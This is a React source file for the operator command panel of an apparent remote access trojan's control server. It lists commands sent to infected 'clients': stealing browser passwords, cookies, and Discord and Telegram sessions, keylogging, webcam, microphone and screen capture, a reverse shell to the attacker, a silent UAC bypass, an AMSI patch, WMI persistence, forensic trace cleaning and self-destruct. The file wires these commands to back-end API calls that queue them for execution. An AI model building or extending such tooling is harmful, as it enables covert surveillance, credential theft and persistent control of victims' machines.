'use client'

import { useState, useEffect } from 'react'
import { Send, Terminal, Eye, Database, Lock, Network, Trash2, Settings } from 'lucide-react'
import { Card, CardContent } from '@/components/ui/card'

interface CommandPanelProps {
  selectedClient: string | null
}

interface Command {
  id: string
  category: string
  name: string
  description: string
  icon: any
  color: string
  params?: string[]
}

const commands: Command[] = [
  // Execution
  { id: 'shell', category: 'Execution', name: 'Shell Command', description: 'Execute system shell commands', icon: Terminal, color: 'text-blue-400', params: ['command'] },
  { id: 'powershell', category: 'Execution', name: 'PowerShell', description: 'Execute PowerShell commands', icon: Terminal, color: 'text-blue-400', params: ['command'] },
  { id: 'script', category: 'Execution', name: 'Run Script', description: 'Execute Python/PowerShell scripts', icon: Terminal, color: 'text-blue-400', params: ['code'] },

  // Files
  { id: 'download', category: 'Files', name: 'Download File', description: 'Download file from client', icon: Database, color: 'text-cyan-400', params: ['path'] },
  { id: 'upload', category: 'Files', name: 'Upload File', description: 'Upload file to client', icon: Database, color: 'text-cyan-400', params: ['path', 'content'] },
  { id: 'write_file', category: 'Files', name: 'Upload / Write File', description: 'Write raw bytes to client file', icon: Database, color: 'text-cyan-400', params: ['path', 'content'] },
  { id: 'file_browser', category: 'Files', name: 'File Browser', description: 'Browse client file system', icon: Database, color: 'text-cyan-400', params: ['path'] },
  { id: 'file_crypt', category: 'Files', name: 'File Encryption', description: 'Encrypt/decrypt files', icon: Lock, color: 'text-cyan-400', params: ['path', 'action'] },
  { id: 'list_drives', category: 'Files', name: 'List Logical Drives', description: 'List all mounted drives', icon: Database, color: 'text-cyan-400' },

  // Surveillance
  { id: 'screenshot', category: 'Surveillance', name: 'Screenshot', description: 'Capture client screen', icon: Eye, color: 'text-purple-400', params: ['height'] },
  { id: 'webcam', category: 'Surveillance', name: 'Webcam Capture', description: 'Capture webcam images', icon: Eye, color: 'text-purple-400', params: ['resolution'] },
  { id: 'stream', category: 'Surveillance', name: 'Screen Stream', description: 'Live screen streaming', icon: Eye, color: 'text-purple-400', params: ['action', 'fps', 'height'] },
  { id: 'webcam_stream', category: 'Surveillance', name: 'Webcam Stream', description: 'Live webcam streaming', icon: Eye, color: 'text-purple-400', params: ['action', 'fps'] },
  { id: 'microphone', category: 'Surveillance', name: 'Microphone Record', description: 'Record audio from microphone', icon: Eye, color: 'text-purple-400', params: ['duration'] },
  { id: 'keylog', category: 'Surveillance', name: 'Keylogger Control', description: 'Start/Stop/Dump keystrokes', icon: Eye, color: 'text-purple-400', params: ['action'] },
  { id: 'clipboard', category: 'Surveillance', name: 'Clipboard Control', description: 'Get/Set clipboard', icon: Eye, color: 'text-purple-400', params: ['action', 'text'] },
  { id: 'active_window', category: 'Surveillance', name: 'Active Window', description: 'Get foreground window title', icon: Eye, color: 'text-purple-400' },
  { id: 'window_logger', category: 'Surveillance', name: 'Window Logger', description: 'Background window tracker', icon: Eye, color: 'text-purple-400', params: ['action'] },
  { id: 'recstream', category: 'Surveillance', name: 'Record Screen', description: 'Record screen to MP4', icon: Eye, color: 'text-purple-400', params: ['action'] },
  { id: 'recwcam', category: 'Surveillance', name: 'Record Webcam', description: 'Record webcam to MP4', icon: Eye, color: 'text-purple-400', params: ['action'] },

  // Credentials
  { id: 'browser_passwords', category: 'Credentials', name: 'Browser Passwords', description: 'Extract saved passwords', icon: Lock, color: 'text-red-400' },
  { id: 'browser_cookies', category: 'Credentials', name: 'Browser Cookies', description: 'Extract browser cookies', icon: Lock, color: 'text-red-400' },
  { id: 'wifi_passwords', category: 'Credentials', name: 'WiFi Passwords', description: 'Extract WiFi credentials', icon: Lock, color: 'text-red-400' },
  { id: 'chromelevator', category: 'Credentials', name: 'Chromelevator', description: 'Advanced Chrome extractor', icon: Lock, color: 'text-red-400' },
  { id: 'extract_discord', category: 'Credentials', name: 'Extract Discord', description: 'Steal Discord session tokens', icon: Lock, color: 'text-red-400' },
  { id: 'extract_telegram', category: 'Credentials', name: 'Extract Telegram', description: 'Package Telegram session to ZIP', icon: Lock, color: 'text-red-400' },
  { id: 'extract_outlook', category: 'Credentials', name: 'Extract Outlook', description: 'Find Outlook profiles and PSTs', icon: Lock, color: 'text-red-400' },

  // System & Network
  { id: 'system_info', category: 'System', name: 'System Info', description: 'Get system information', icon: Network, color: 'text-green-400' },
  { id: 'process', category: 'System', name: 'Process Manager', description: 'List/kill processes', icon: Network, color: 'text-green-400', params: ['action', 'pid'] },
  { id: 'registry', category: 'System', name: 'Registry Manager', description: 'Read/write registry', icon: Network, color: 'text-green-400', params: ['action', 'path'] },
  { id: 'port_scan', category: 'Network', name: 'Port Scanner', description: 'Scan network ports', icon: Network, color: 'text-blue-400', params: ['ip', 'ports'] },
  { id: 'netstat', category: 'Network', name: 'Netstat', description: 'List active network connections', icon: Network, color: 'text-blue-400' },
  { id: 'arp', category: 'Network', name: 'ARP Table', description: 'Dump internal ARP mappings', icon: Network, color: 'text-blue-400' },
  { id: 'socks', category: 'Network', name: 'SOCKS5 Proxy', description: 'Start cross-platform tunneling', icon: Network, color: 'text-blue-400', params: ['action', 'port'] },
  { id: 'reverse_shell', category: 'Network', name: 'Reverse Shell', description: 'Reverse connect back to attacker', icon: Terminal, color: 'text-blue-400', params: ['ip', 'port'] },
  { id: 'service', category: 'System', name: 'Service Control', description: 'Manage Windows services', icon: Network, color: 'text-green-400', params: ['action', 'name'] },
  { id: 'av_discovery', category: 'System', name: 'AV Discovery', description: 'Detect installed Antivirus engines', icon: Lock, color: 'text-green-400' },

  // Persistence
  { id: 'persistence', category: 'Persistence', name: 'Enable Persistence', description: 'Install persistence mechanism', icon: Lock, color: 'text-amber-400' },
  { id: 'unpersist', category: 'Persistence', name: 'Remove Persistence', description: 'Uninstall persistence', icon: Lock, color: 'text-amber-400' },
  { id: 'elevate', category: 'Persistence', name: 'Request Admin (UAC)', description: 'Trigger explicit UAC elevation', icon: Lock, color: 'text-amber-400' },
  { id: 'uac_bypass', category: 'Persistence', name: 'Silent UAC Bypass', description: 'Automated Fodhelper elevation', icon: Lock, color: 'text-amber-400', params: ['program'] },
  { id: 'amsi_bypass', category: 'Persistence', name: 'AMSI Patch', description: 'Patch AMSI in memory', icon: Lock, color: 'text-amber-400' },
  { id: 'enable_rdp', category: 'Persistence', name: 'Enable RDP', description: 'Open RDP daemon and Firewall', icon: Lock, color: 'text-amber-400', params: ['adduser'] },
  { id: 'unelevate', category: 'Persistence', name: 'Drop Privileges', description: 'Relinquish Administrator token', icon: Lock, color: 'text-amber-400' },
  { id: 'wmi', category: 'Persistence', name: 'WMI Persistence', description: 'Install WMI persistence', icon: Lock, color: 'text-amber-400', params: ['cmd'] },

  // Interaction
  { id: 'open_url', category: 'Interaction', name: 'Open URL', description: 'Force open browser link', icon: Terminal, color: 'text-orange-400', params: ['url'] },
  { id: 'message_box', category: 'Interaction', name: 'Message Box', description: 'Pop up GUI alert', icon: Terminal, color: 'text-orange-400', params: ['title', 'text'] },
  { id: 'wallpaper', category: 'Interaction', name: 'Set Wallpaper', description: 'Change desktop background', icon: Terminal, color: 'text-orange-400', params: ['path'] },
  { id: 'power', category: 'Interaction', name: 'Power Control', description: 'Lock/Shutdown/Reboot', icon: Terminal, color: 'text-orange-400', params: ['action'] },
  { id: 'input_control', category: 'Interaction', name: 'Mouse & Keyboard', description: 'Remote control system inputs', icon: Terminal, color: 'text-orange-400', params: ['action', 'x', 'y', 'button', 'text'] },
  { id: 'block_input', category: 'Interaction', name: 'Block Input', description: 'Disable local input devices', icon: Lock, color: 'text-orange-400', params: ['state'] },
  { id: 'browser_kill', category: 'Interaction', name: 'Kill Browsers', description: 'Force crash web browsers', icon: Trash2, color: 'text-orange-400' },
  { id: 'set_autorun', category: 'Interaction', name: 'Autorun Scripts', description: 'Configure reconnect commands', icon: Terminal, color: 'text-orange-400', params: ['json'] },
  
  // Cleanup
  { id: 'abort', category: 'Cleanup', name: 'Abort Task', description: 'Kill asynchronous module by ID', icon: Trash2, color: 'text-gray-400', params: ['id'] },
  { id: 'clean_traces', category: 'Cleanup', name: 'Clean Traces', description: 'Remove forensic evidence', icon: Trash2, color: 'text-gray-400' },
  { id: 'self_destruct', category: 'Cleanup', name: 'Self Destruct', description: 'Remove malware from system', icon: Trash2, color: 'text-gray-400' }
]

const categories = Array.from(new Set(commands.map((cmd) => cmd.category)))

export default function CommandPanel({ selectedClient }: CommandPanelProps) {
  const [selectedCategory, setSelectedCategory] = useState<string>('Execution')
  const [commandOutput, setCommandOutput] = useState<Array<{ id: string; cmd: string; output: string }>>([])
  const [inputValue, setInputValue] = useState('')
  const [params, setParams] = useState<Record<string, Record<string, string>>>({})

  useEffect(() => {
    if (!selectedClient) return
    
    const fetchHistory = async () => {
      try {
        const res = await fetch(`/api/commands?action=history&clientId=${selectedClient}`)
        if (res.ok) {
          const data = await res.json()
          const formatted = data.map((cmd: any) => {
            let resultDisplay = '→ Processing...'
            if (cmd.status === 'completed') {
              try {
                let parsedResult = cmd.result
                if (typeof parsedResult === 'string') {
                  try {
                    parsedResult = JSON.parse(parsedResult)
                  } catch (e) {}
                }

                if (typeof parsedResult === 'string') {
                   resultDisplay = '→\n' + parsedResult
                } else if (parsedResult && typeof parsedResult === 'object') {
                   if (parsedResult.stdout !== undefined || parsedResult.stderr !== undefined) {
                      resultDisplay = ''
                      if (parsedResult.stdout) resultDisplay += `[STDOUT]\n${parsedResult.stdout}\n`
                      if (parsedResult.stderr) resultDisplay += `[STDERR]\n${parsedResult.stderr}\n`
                      resultDisplay = resultDisplay.trim() || '→ (Command Executed Successfully)'
                   } else {
                      resultDisplay = '→\n' + JSON.stringify(parsedResult, null, 2)
                   }
                } else {
                   resultDisplay = '→ ' + String(parsedResult)
                }
              } catch {
                resultDisplay = '→ ' + String(cmd.result)
              }
            } else if (cmd.status === 'failed') {
              resultDisplay = '→ Error: ' + cmd.error_message
            }
            
            return {
              id: cmd.id,
              cmd: `${cmd.command_name} ${cmd.parameters ? JSON.stringify(cmd.parameters) : ''}`,
              output: `[${new Date(cmd.created_at).toLocaleTimeString()}] Status: ${cmd.status}\n${resultDisplay}`
            }
          }).reverse() // oldest first for terminal-like display
          setCommandOutput(formatted)
        }
      } catch (e) {}
    }

    fetchHistory()
    const interval = setInterval(fetchHistory, 1000)
    return () => clearInterval(interval)
  }, [selectedClient])

  const handleParamChange = (cmdId: string, param: string, value: string) => {
    setParams(prev => ({
      ...prev,
      [cmdId]: {
        ...(prev[cmdId] || {}),
        [param]: value
      }
    }))
  }

  const filteredCommands = commands.filter((cmd) => cmd.category === selectedCategory)

  const executeCommand = async (command: Command) => {
    const cmdParams = params[command.id] || {}
    
    try {
      const resp = await fetch('/api/commands', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          client_id: selectedClient,
          command_type: 'execution',
          command_name: command.id,
          parameters: cmdParams
        })
      })
      const data = await resp.json()
      
      if (resp.ok) {
        await fetch('/api/execute', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             commandId: data.id,
             clientId: selectedClient,
             commandType: 'execution',
             commandName: command.id,
             parameters: cmdParams
           })
        })
        
        const newEntry = {
          id: Math.random().toString(),
          cmd: command.name,
          output: `[${new Date().toLocaleTimeString()}] Executing: ${command.name}\n→ Command queued processing...`,
        }
        setCommandOutput([...commandOutput, newEntry])
      } else {
        throw new Error(data.error || 'Failed to queue command')
      }
    } catch (e: any) {
      const newEntry = {
        id: Math.random().toString(),
        cmd: command.name,
        output: `[${new Date().toLocaleTimeString()}] Error: ${command.name}\n→ ${e.message || String(e)}`,
      }
      setCommandOutput([...commandOutput, newEntry])
    }
  }

  const handleDirectCommand = async () => {
    if (!inputValue.trim()) return
    
    // Default to shell execution for direct commands
    try {
      const resp = await fetch('/api/commands', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          client_id: selectedClient,
          command_type: 'execution',
          command_name: 'shell',
          parameters: { command: inputValue }
        })
      })
      const data = await resp.json()
      
      if (resp.ok) {
        await fetch('/api/execute', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             commandId: data.id,
             clientId: selectedClient,
             commandType: 'execution',
             commandName: 'shell',
             parameters: { command: inputValue }
           })
        })
        
        const newEntry = {
          id: Math.random().toString(),
          cmd: `Direct: shell ${inputValue}`,
          output: `[${new Date().toLocaleTimeString()}] $ ${inputValue}\n→ Command queued successfully`,
        }
        setCommandOutput([...commandOutput, newEntry])
        setInputValue('')
      } else {
        throw new Error(data.error || 'Failed to queue direct command')
      }
    } catch (e: any) {
      const newEntry = {
        id: Math.random().toString(),
        cmd: `Direct: ${inputValue}`,
        output: `[${new Date().toLocaleTimeString()}] Error\n→ ${e.message || String(e)}`,
      }
      setCommandOutput([...commandOutput, newEntry])
    }
  }

  if (!selectedClient) {
    return (
      <div className="flex items-center justify-center h-full">
        <Card className="p-12 text-center max-w-md">
          <Settings className="w-12 h-12 mx-auto mb-4 text-muted-foreground opacity-50" />
          <h2 className="text-lg font-semibold text-foreground mb-2">No Client Selected</h2>
          <p className="text-muted-foreground text-sm">Select a client from the left panel to execute commands</p>
        </Card>
      </div>
    )
  }

  return (
    <div className="flex flex-col h-full gap-4 p-6">
      {/* Categories */}
      <div className="flex gap-2 overflow-x-auto pb-2">
        {categories.map((category) => (
          <button
            key={category}
            onClick={() => setSelectedCategory(category)}
            className={`px-4 py-2 rounded-lg whitespace-nowrap text-sm font-medium transition-colors ${
              selectedCategory === category
                ? 'bg-primary text-primary-foreground'
                : 'bg-card border border-border text-foreground hover:border-primary/50'
            }`}
          >
            {category}
          </button>
        ))}
      </div>

      {/* Commands Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 flex-1 overflow-y-auto">
        {filteredCommands.map((command) => {
          const Icon = command.icon
          return (
            <Card
              key={command.id}
              className="p-4 hover:border-primary/50 transition-all group hover:bg-primary/5"
            >
              <div className="flex items-start justify-between mb-3">
                <Icon className={`w-5 h-5 ${command.color}`} />
              </div>
              <h3 className="font-semibold text-sm text-foreground mb-1">{command.name}</h3>
              <p className="text-xs text-muted-foreground mb-3">{command.description}</p>
              {command.params && (
                <div className="text-xs text-muted-foreground mb-4 space-y-2">
                  {command.params.map((param) => (
                    <div key={param} className="flex flex-col gap-1">
                      <label className="capitalize">{param.replace('_', ' ')}:</label>
                      <input 
                        type="text" 
                        value={params[command.id]?.[param] || ''}
                        onChange={(e) => handleParamChange(command.id, param, e.target.value)}
                        placeholder={`Enter ${param}...`}
                        className="px-2 py-1 bg-input/50 border border-border rounded focus:outline-none focus:ring-1 focus:ring-primary text-foreground"
                      />
                    </div>
                  ))}
                </div>
              )}
              <button 
                onClick={() => executeCommand(command)} 
                className="w-full text-xs py-2 rounded bg-primary/20 text-primary hover:bg-primary/30 transition-colors group-hover:bg-primary group-hover:text-primary-foreground"
              >
                Execute
              </button>
            </Card>
          )
        })}
      </div>

      {/* Command Input */}
      <Card className="p-4 border-border">
        <label className="block text-xs font-semibold text-muted-foreground mb-3">Direct Command Input</label>
        <div className="flex gap-2">
          <input
            type="text"
            value={inputValue}
            onChange={(e) => setInputValue(e.target.value)}
            onKeyPress={(e) => e.key === 'Enter' && handleDirectCommand()}
            placeholder="Enter custom command..."
            className="flex-1 px-4 py-2 bg-input border border-border rounded-lg text-sm text-foreground placeholder-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary"
          />
          <button
            onClick={handleDirectCommand}
            className="px-4 py-2 bg-primary text-primary-foreground rounded-lg hover:bg-primary/90 transition-colors flex items-center gap-2"
          >
            <Send className="w-4 h-4" />
            Send
          </button>
        </div>
      </Card>

      {/* Output */}
      {commandOutput.length > 0 && (
        <Card className="p-4 border-border bg-input/30 flex-1 min-h-[200px] flex flex-col">
          <label className="block text-xs font-semibold text-muted-foreground mb-3 flex-shrink-0">Command Output</label>
          <div className="flex-1 overflow-y-auto space-y-2">
            {commandOutput.slice(-15).map((entry) => (
              <div key={entry.id} className="text-xs font-mono text-green-400 bg-black/30 p-2 rounded whitespace-pre-wrap break-all">
                <div className="text-muted-foreground mb-1">&gt; {entry.cmd}</div>
                <div>{entry.output}</div>
              </div>
            ))}
          </div>
        </Card>
      )}
    </div>
  )
}
